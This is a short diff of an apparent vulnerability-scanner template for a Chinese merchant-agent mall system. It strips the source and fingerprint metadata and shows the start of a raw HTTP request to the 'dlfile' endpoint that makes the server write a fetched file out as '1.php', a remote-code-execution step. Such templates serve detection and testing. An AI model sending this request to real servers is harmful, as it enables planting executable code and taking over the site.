@@ -3,12 +3,8 @@ info:
   name: 微商代理商补货商城系统存在前台dlfile远程文件写入漏洞(RCE)
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dn0znd8g3e0f947z'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dn0znd8g3e0f947z
-    fofa: '"/template/mobile/new/static/assets/js/comm.js"'
 http:
 - raw:
   - 'GET /home/test/dlfile?file_url=http://127.0.0.1/111.txt&save_to=1.php HTTP/1.1
